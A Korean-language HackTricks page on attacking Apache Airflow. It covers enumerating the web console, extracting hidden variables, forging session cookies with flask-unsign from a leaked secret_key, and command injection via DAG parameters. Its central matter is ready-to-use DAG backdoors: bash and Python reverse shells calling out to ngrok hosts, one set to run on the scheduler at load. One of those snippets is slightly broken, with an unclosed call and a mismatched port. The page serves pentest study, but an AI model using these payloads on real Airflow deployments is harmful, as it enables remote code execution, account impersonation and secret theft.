# Apache Airflow 보안

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

[**Apache Airflow**](https://airflow.apache.org)는 **데이터 파이프라인 또는 워크플로우를 조정하고 예약**하기 위한 플랫폼으로 사용됩니다. 데이터 파이프라인의 "조정"이란 다양한 소스에서 발생하는 복잡한 데이터 워크플로우를 정리, 조정 및 관리하는 과정을 의미합니다. 이러한 조정된 데이터 파이프라인의 주요 목적은 처리된 데이터 세트를 제공하는 것입니다. 이러한 데이터 세트는 비즈니스 인텔리전스 도구, 데이터 과학 및 머신 러닝 모델을 포함한 다양한 응용 프로그램에서 광범위하게 활용되며, 이는 대규모 데이터 응용 프로그램의 기능에 기초합니다.

기본적으로, Apache Airflow를 사용하면 **무언가** (이벤트, cron) **발생 시 코드 실행을 예약**할 수 있습니다.

## 로컬 랩

### Docker-Compose

[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)의 **docker-compose 구성 파일**을 사용하여 완전한 Apache Airflow 도커 환경을 시작할 수 있습니다. (MacOS에서는 도커 VM에 적어도 6GB의 RAM을 할당해야 합니다).

### Minikube

Apache Airflow를 실행하는 **간단한 방법** 중 하나는 **minikube**를 사용하여 실행하는 것입니다:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow 구성

Airflow는 구성에 **민감한 정보**를 저장할 수 있으며, 약한 구성을 찾을 수도 있습니다:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflow를 공격하기 전에 **권한이 작동하는 방식**을 이해해야 합니다:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 공격

### 웹 콘솔 열거

웹 콘솔에 **접근할 수 있다면**, 다음 정보 중 일부 또는 모두에 접근할 수 있습니다:

* **변수** (여기에 사용자 정의 민감한 정보가 저장될 수 있음)
* **연결** (여기에 사용자 정의 민감한 정보가 저장될 수 있음)
* `http://<airflow>/connection/list/`에서 접근 가능
* [**구성**](./#airflow-configuration) (비밀 키 및 비밀번호와 같은 민감한 정보가 저장될 수 있음)
* 사용자 및 역할 목록
* 각 DAG의 **코드** (흥미로운 정보가 포함될 수 있음)

### 변수 값 검색

Airflow에서는 DAG가 값을 **액세스**할 수 있도록 변수를 저장할 수 있습니다. 다른 플랫폼의 비밀과 유사합니다. **충분한 권한**이 있다면 GUI에서 `http://<airflow>/variable/list/`에서 변수에 액세스할 수 있습니다.\
기본적으로 Airflow는 GUI에서 변수의 값을 표시하지만, [**이 글**](https://marclamberti.com/blog/variables-with-apache-airflow/)에 따르면 GUI에서 **별표**로 표시될 **값**의 **변수 목록**을 설정할 수 있습니다.

![](<../../.gitbook/assets/image (79).png>)

그러나 이러한 **값**은 여전히 **CLI**(DB 액세스 필요), **임의의 DAG** 실행, 변수 엔드포인트에 **API**(API를 활성화해야 함)로 **검색**할 수 있으며, 심지어 **GUI 자체에서도!**\
GUI에서 이러한 값을 액세스하려면 액세스하려는 **변수를 선택**하고 **작업 -> 내보내기**를 클릭하면 됩니다.\
또 다른 방법은 **검색 필터링**을 사용하여 **숨겨진 값**을 **무차별 대입**하여 찾는 것입니다:

![](<../../.gitbook/assets/image (30).png>)

### 권한 상승

**`expose_config`** 구성이 **True**로 설정된 경우, **사용자 역할** 및 **그 이상**에서는 **웹에서 구성을 읽을 수** 있습니다. 이 구성에는 **`secret_key`**가 표시되므로 이 유효한 키를 가진 사용자는 **자신의 서명된 쿠키를 생성하여 다른 사용자 계정을 가장**할 수 있습니다.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG 백도어 (Airflow 워커에서의 RCE)

만약 **DAG가 저장되는 곳에 쓰기 권한**이 있다면, **하나를 생성**하여 **리버스 쉘을 보낼 수 있습니다.**\
이 리버스 쉘은 **airflow 워커 컨테이너** 내에서 실행될 것입니다:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG 백도어 (Airflow 스케줄러에서의 RCE)

만약 **코드의 루트에서 실행되도록 설정**한다면, 현재 작성 시점에서는 DAG 폴더에 넣은 후 몇 초 후에 **스케줄러에 의해 실행**될 것입니다.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG 생성

DAG 클러스터 내부의 기기를 **침해**하면 `dags/` 폴더에 새로운 **DAG 스크립트**를 생성할 수 있으며, 이는 DAG 클러스터 내의 다른 기기에도 **복제**됩니다.

### DAG 코드 삽입

GUI에서 DAG를 실행할 때 **인수를 전달**할 수 있습니다.\
따라서, DAG가 올바르게 작성되지 않은 경우 **Command Injection에 취약**할 수 있습니다.\
이것이 이 CVE에서 발생한 사례입니다: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAG에서 **Command Injection을 찾기 시작**하기 위해 알아야 할 것은 **매개변수**가 **다음 코드로 액세스**된다는 것입니다: **`dag_run.conf.get("param_name")`**.

또한, **변수**에서도 동일한 취약점이 발생할 수 있습니다 (충분한 권한이 있다면 GUI에서 변수의 값을 **제어**할 수 있음에 유의하세요). 변수는 다음과 같이 **액세스**됩니다:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
예를 들어, 그들이 bash 명령어 안에서 사용된다면, 명령어 인젝션을 수행할 수 있습니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법들:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
